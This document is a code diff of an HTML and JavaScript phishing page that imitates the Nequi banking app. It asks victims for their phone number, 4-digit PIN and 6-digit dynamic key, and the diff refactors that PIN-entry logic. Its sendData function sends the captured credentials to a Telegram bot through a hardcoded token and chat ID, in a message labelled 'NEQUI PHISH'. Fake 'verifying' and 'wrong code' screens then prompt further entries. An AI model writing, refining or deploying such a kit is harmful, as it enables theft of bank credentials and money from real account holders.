@@ -152,7 +152,7 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
-    /* ==================== LOADER MEJORADO ==================== */
+    /* Loader Mejorado */
     #loader {
       display: none;
       flex-direction: column;
@@ -160,39 +160,21 @@
       align-items: center;
       height: 100%;
     }
-
-    .spinner-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-bottom: 30px;
-    }
-
     .spinner {
       width: 65px;
       height: 65px;
       border: 5px solid rgba(255, 45, 149, 0.15);
       border-top: 5px solid #FF2D95;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      animation: spin 1.2s linear infinite;
       margin-bottom: 25px;
     }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
 
     .loader-text {
       font-size: 17px;
       color: #E0B0FF;
       font-weight: 500;
-      letter-spacing: 0.5px;
-    }
-
-    .nequi-icon {
-      margin-top: 40px;
-      opacity: 0.15;
-      font-size: 80px;
     }
 
     .error-text {
@@ -207,7 +189,7 @@
 
   <div class="phone-frame">
 
-    <!-- Pantalla 1, 2 y 3 se mantienen igual (las dejo resumidas) -->
+    <!-- Pantalla 1 -->
     <div class="screen" id="screen1">
       <div class="help">?</div>
       <div class="nequi-logo"><span>■</span>Nequi</div>
@@ -218,6 +200,7 @@
       <button onclick="goToPassword()">Entra</button>
     </div>
 
+    <!-- Pantalla 2 - Clave de 4 dígitos -->
     <div class="screen" id="screen2">
       <div class="back" onclick="goBack(1)">←</div>
       <div class="title">Escribe tu clave</div>
@@ -241,6 +224,7 @@
       </div>
     </div>
 
+    <!-- Pantalla 3 - Clave Dinámica -->
     <div class="screen" id="screen3">
       <div class="back" onclick="goBack(2)">←</div>
       <div class="title">Clave Dinámica</div>
@@ -265,16 +249,13 @@
       </div>
     </div>
 
-    <!-- Loader Mejorado y Centrado -->
+    <!-- Loader -->
     <div class="screen" id="loader">
-      <div class="spinner-container">
-        <div class="spinner"></div>
-        <div class="loader-text">Verificando clave dinámica...</div>
-      </div>
-      <div class="nequi-icon">■</div>
+      <div class="spinner"></div>
+      <div class="loader-text">Verificando clave dinámica...</div>
     </div>
 
-    <!-- Error Screen -->
+    <!-- Pantalla de Error -->
     <div class="screen" id="errorScreen">
       <div class="error-text">Clave dinámica errada</div>
       <div class="message">El código ingresado no es correcto.<br>Por favor intenta nuevamente.</div>
@@ -287,8 +268,8 @@
   <script>
     let phoneNumber = "";
     let attemptsLeft = 3;
-    let currentPin = "";
-    let currentLength = 4;
+    let pin4 = "";
+    let pin6 = "";
 
     const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
     const chatId = "773351137";
@@ -304,37 +285,52 @@
       document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
       document.getElementById(id).style.display = 'flex';
 
-      if (id === 'screen2' || id === 'screen3') {
-        currentLength = (id === 'screen2') ? 4 : 6;
-        currentPin = "";
-        updatePins();
+      if (id === 'screen2') pin4 = "";
+      if (id === 'screen3') pin6 = "";
+      updatePins();
+    }
+
+    function addDigit(num, screen) {
+      if (screen === 4) {
+        if (pin4.length < 4) {
+          pin4 += num;
+          updatePins();
+          if (pin4.length === 4) sendData(4);
+        }
+      } else if (screen === 6) {
+        if (pin6.length < 6) {
+          pin6 += num;
+          updatePins();
+          if (pin6.length === 6) sendData(6);
+        }
       }
     }
 
-    function addDigit(num, length) {
-      if (currentPin.length < length) {
-        currentPin += num;
-        updatePins();
-        if (currentPin.length === length) sendData();
-      }
-    }
-
-    function deleteDigit() {
-      currentPin = currentPin.slice(0, -1);
+    function deleteDigit(screen) {
+      if (screen === 4) pin4 = pin4.slice(0, -1);
+      if (screen === 6) pin6 = pin6.slice(0, -1);
       updatePins();
     }
 
     function updatePins() {
-      const container = currentLength === 4 ? "#pins4" : "#pins6";
-      const pins = document.querySelectorAll(container + " .pin");
-      pins.forEach((pin, i) => {
-        pin.textContent = i < currentPin.length ? "●" : "";
+      // Actualizar pines de 4 dígitos
+      const pins4 = document.querySelectorAll("#pins4 .pin");
+      pins4.forEach((pin, i) => {
+        pin.textContent = i < pin4.length ? "●" : "";
+      });
+
+      // Actualizar pines de 6 dígitos
+      const pins6 = document.querySelectorAll("#pins6 .pin");
+      pins6.forEach((pin, i) => {
+        pin.textContent = i < pin6.length ? "●" : "";
       });
     }
 
-    function sendData() {
-      const tipo = currentLength === 4 ? "Clave Principal" : "Clave Dinámica";
-      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${currentPin}\n⏰ ${new Date().toLocaleString('es-CO')}`;
+    function sendData(length) {
+      const code = length === 4 ? pin4 : pin6;
+      const tipo = length === 4 ? "Clave Principal" : "Clave Dinámica";
+
+      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${code}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -345,7 +341,7 @@
       showScreen('loader');
 
       setTimeout(() => {
-        if (currentLength === 4) {
+        if (length === 4) {
           showScreen('screen3');
         } else {
           attemptsLeft--;
